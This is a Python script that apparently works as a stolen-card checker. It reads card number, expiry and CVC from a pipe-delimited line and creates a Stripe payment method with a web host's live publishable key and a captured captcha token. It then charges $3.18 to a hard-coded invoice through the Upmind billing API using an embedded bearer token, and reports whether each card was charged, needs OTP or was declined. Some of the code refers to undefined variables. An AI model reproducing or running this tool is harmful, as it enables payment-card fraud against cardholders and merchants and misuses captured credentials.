import requests,re
import random
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	cc = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={cc}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=EG&payment_user_agent=stripe.js%2Fd991d0758e%3B+stripe-js-v3%2Fd991d0758e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fclients.mochahost.com&time_on_page=74772&client_attribution_metadata[client_session_id]=e714c8c2-a532-4b3c-8d2d-f644c3bf1397&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=NA&muid=384e7bd9-aadf-47bf-a7b8-1e95194ba9dd1ffb4b&sid=NA&key=pk_live_51Ma5ExK4kABOIfpmLFtPCp9XgSbk8IebArcfDdpofKHdD5DetpEJ04KLCGlYWgrb3kCLAsbTu0QpwpaKmUl6CSwN007yjC8XGV&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYSKRi9fedIiWc3Ct_5kkBwxNSeNcxah6q7Nd7q8VaQt6bhyKlT5aFRBRl2QSwITOX-ugTQjg9q9E-jdFmaix7tTd8rtdGLEVik-DR8yB6VcJ3fGXi97I03bYLjbbkeFauRho_3lzHWNPpGLc46JHkpXECK24jAHznUHmc2vwLdnL_2EUvQ1IpDaTJ0cE3BhJvuVv-aNzJ75owqyjoM2RnpO38bWigKYmeyJCwRaT7XrqSAwZrAlJbaPRwKv1oeyepls7YKtX90JUiPQVKOjevplSgKL9c90Von6m4fpDl2Z0XMJsfPqXQSs9YrBfiZFsAwNCSr7CT1bTm-j4ifGmFehrYdGPOLoaGa2gfqTxvup51dVrGYT8CoIpWE0GfVmM-tvrrLqnuYMGs2nNivtfpGFKNVsLkCrkKMsrvbsMgIL6x_c4TpOxn3gSgqFa0EDfVM1p8Ze0hdCUwd6892Ee7WpkUYO5IyHIp-2eJfyOW6y4jmveVWJVpVoVKMG2IMQLHl3vLvEMDqUOk6OPPscxC3DbWzx0_wBVCpsyyNulTKBbAK1Dg9gqIDShJawds99bOpjG2P4sTsNUNoRL9h1VhGnkxMfJwmy5WcM0nFrPmYrKwMLAsvHF_cEi2hQCpR9t6MKdSCknVkrBY2uwx5Uab_xCbrdTyUYgJnA940rEWgdf6uwC0sPJgyHEJx0ry6-NsewhWL5wj_jrShM2_EK_HbTNcBjmPWH4kF4Au0XQF4_Ndlaqc0xIQKTWrf5VZakw1vfj2b3yyCfcXYjexmzOmKtj9mVyBRxabMubonpedWEnrIRZX29lSTNMgWVMhwGwVZCEi6UkNV6xJEY5hsSCDdYCnE22ESYlvqDn0Js6vBZSrA4NVxYHmbVrqsBM00jm9H7MNOhubxp_11IsYOkI2OzOcaoi2OeRAf7k3e2CvSbf7LIwFRhd1hAe1-3kmLl31LDGAzVViXhmaIDguNRmpDSn3Z9RvqiBD_jRu5LwcpmHG4TV5OUHowfYWQsmGOD2r1brMbJVi9fs5HswtME3gwggRAtHS_3-4NyRAmKXS187ty4HAqH9EH3aKISebj1-ZeGeAhtuK3qUze4pOVN2VlQ74t3TydAAh_xOL15Ig8Jr0Dloxm7Wr49NI0jE-Nf6PBTSefUnIQy0poSVvVxJ6BJ-fyfWUSDT_iSj_uEctar70w8Lc5UT86d9KbKsQlco1EdsE6pdRg8bZf84h8QmWGDzHjQ2xV9k_Y2iyOEMu0UKoztwOfkhBJH48AuIOdBwKvPvI38aGfojHzUdB1aRkAolQIRrNqXd1t91w3E_OCrtdzSuTe3OIY254mSZoSqA6TWb8cbuHzrhXJmIkfyMg4zRf2L1VhnWSHMAzzjSbaNlH4Tu-s2f2qR5Xfj7bBZxNPwPSQDgANXSCLFwpLyjHN-wpIOZ4BdrGYjRxIlX9zZXCuvQHJs6fmuVZ1kjIvDnOt_VvQfX_nJd8JtMcV6D9OESbHFDQ7HOsOEef-F97uZEQGqrh_D3iVkU7_ZzEE6jCVzrf1nUuRAyuYziODD7qoW-Xkpuu2FQEdizfGDR5Ptzs4v9aN0zbOKi1H3g-L4iVRhEl4T6jLeWtB6U6Ag-8EP6UNf2-UdsCT4erLOO0V9OakXLBxAuIHgo5VNsIQEBlLJl6Waydc025LhDhWFYPxvmRS2y0jMaCBf5EsktNunlMEDnwwyhvUO4k-q_W-YYt7SimmUS3lBOzqHDLdJ_AvaRUWhpPESYNDnaHYcgSdAO-EGOO8f1MQa9xaxW4ijEzwYrtULV6hSoHoUMxl9wAagwWsRaC5y8U6jaqWNq82zzUR8Kib28NEDO2-cMdCPO7DKw8G1r37x4-0s3GRNTkX7e5FvgXszUPlrmAlcQDqdhdw4JPy9FrVe0mGU6V5aSE4TVJLXlCauzwrHwY57sOS5Ps-b7iG3AmM7Enbu2dLgMDqautRCFnfX2yxBovAVFnsk6HdjKx3pKsOJVoD02QoW0OqqAXRtKZOPmdANXJHRObDjw-9mHa6t7OXy_gszA1YeXdTEXn8_HIxn3Wf1K58FHvAo2V4cM5mdpzOqHNoYXJkX2lkzgMxg2-ia3KoMTFkMTRkOGaicGQA.40xWNJPxwCjDbX9dxt2-Ave1IK1FsL8cStDkYf69DdI'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
	try:
		id=(response['id'])
	except Exception as e:
		if "Your card has insufficient funds." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card's security code is invalid." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card does not support this type of purchase." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card's expiration month is invalid." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		else:
			print('f')
		return
	headers = {
	    'authority': 'api.upmind.io',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI2NTIzIiwianRpIjoiMmU5MzViMzFmYjAzOWJiOTMwNjU2Zjk3M2I4ZjkzYjc5NzYwZThhNWE2MzFiMWEzZGI4ODMyZDBhYTc4Y2JmYTVkODAwNTI5NmFmNWY1ODMiLCJpYXQiOjE3MTkwNDg2MTEsIm5iZiI6MTcxOTA0ODYxMSwiZXhwIjoxNzE5MDUyMjExLCJzdWIiOiIyNDQwNjkxIiwic2NvcGVzIjpbXX0.aeYBUx_cAqayCM3b2E-BXZzklhsxfzsuWxLYhH90QVZD2W1tY75Oxscb-Qvi3Hz6Sf70JOCaU4YluHdVZXa8p7uVatFU_DoFUyj5qYlhJlJVlxzPaMw7j9KEjn4U671CEpNMv4ZBefLi7GcaYB7CTAVVyjPB_SEFVe4JNxzoadDKDbGYa0bHBGe7TVptqgHxc_TwRce4ODZ6qtDU_6nUQt38gjvvAzV51LBCVp14ESm_fT4xzl_CWPVivz-kcAnmySo7C6pm5uE9gKasMqBzQeImPb0MJEuylvmByX0aVhsQNl9rO7e7qwjzbPLR3YuDBGzXp0hBzGGX7Sk9whkaLhHTPS12PVgw-i2lHZSdHpIOtTXWN9jjsqQ_zKnCuXXFmdBOtnwFLHiyvYygz7Prg9ZuMYYJL9go9J1H9EJGYP4w_T8lvDTISNkOq1uCcMDJSSOeG_Oy9LFZdeQElkG6LxVbZXS82FAiPiQm3IovrE9QtOt-L7jNb_9v2OFY_FTDMxfs8eWtoj4tnWd0zKpkHy1hk23rbh9kKHUcERNeZruzdrGbd2D_cpoyFNEDCG-s4UCOGa_bUlqxzLC8CnP7iG92V1MVvoRK2_pUJPjv6xud_XfEMpJ2KBenFEwiUayvmpJgWha_nWTbd7MF0Az2ehWKBi_OCsZwfLqxF7VFT6w',
	    'content-type': 'application/json',
	    'origin': 'https://clients.mochahost.com',
	    'referer': 'https://clients.mochahost.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'store_on_payment': True,
	    'store_on_payment_auto_payment': True,
	    'gateway_id': 'd35983e2-306e-7540-821f-14981d210d76',
	    'payment_method_addition': {
	        'payment_method_type': 'card',
	        'payment_method_id': id,
	    },
	    'amount': 3.18,
	    'client_id': '3e8d569d-0724-5232-78ee-cd4e85312160',
	    'account_id': '52d137e0-8d24-1535-2ed7-b3495163789e',
	    'invoice_id': 'd5308768-251d-483e-e899-b847e390921e',
	    'return_url': '?success=https%3A%2F%2Fclients.mochahost.com%2Fbilling%2Finvoices%2Fd5308768-251d-483e-e899-b847e390921e%2Fview&failed=https%3A%2F%2Fclients.mochahost.com%2Fbilling%2Finvoices%2Fd5308768-251d-483e-e899-b847e390921e%2Fview',
	    'cancel_url': 'https://clients.mochahost.com/billing/invoices/d5308768-251d-483e-e899-b847e390921e/view',
	    'currency_code': 'USD',
	}
	
	req0 = requests.post('https://api.upmind.io/api/payments', headers=headers, json=json_data)
	if "Payment success" in req0.text:
		return "Charged"
	elif "generic_decline" in req0.text:
		code = req0.json()['error']['message']
		msg = req0.json()['error']['message']
		return str(code+":"+msg)
	elif "BEGIN" in req0.text:
		return "OTP"
	else:
		try:
			code = req0.json()['error']['message']
			return code
		except:
			try:
				return req0.json()['error']['message']
			except:
				return req0.text
	